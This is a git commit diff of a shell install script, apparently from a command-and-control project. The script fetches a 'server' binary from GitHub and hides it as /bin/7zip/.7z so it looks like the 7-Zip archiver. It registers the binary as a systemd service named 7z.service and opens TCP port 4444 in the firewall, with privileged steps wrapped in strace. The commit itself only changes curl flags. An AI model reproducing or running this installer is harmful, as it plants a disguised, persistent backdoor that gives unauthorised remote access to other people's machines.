8683367f392feb510b21c9cfbf0ae2c12f08874b
Ricardo <ricardo.palma.rjp@gmail.com>
2024-03-21 19:12:31 -0500

    Fixed curl

--- install.sh
+++ install.sh
@@ -1,10 +1,10 @@
 #!/bin/bash
 sudo strace -o /dev/null mkdir /bin/7zip
-curl https://github.com/Palma-Ricardo/c2/raw/main/server -o server
+curl -LJO https://github.com/Palma-Ricardo/c2/raw/main/server -o server
 sudo strace -o /dev/null mv server /bin/7zip/.7z
 rm server
 sudo strace -o /dev/null chmod +x /bin/7zip/.7z
-curl https://github.com/Palma-Ricardo/c2/raw/main/7z.service -o 7z.service
+curl -LJO https://github.com/Palma-Ricardo/c2/raw/main/7z.service -o 7z.service
 sudo strace -o /dev/null mv 7z.service /etc/systemd/system/7z.service
 rm 7z.service
 sudo strace -o /dev/null firewall-cmd --zone=public --permanent --add-port=4444/tcp
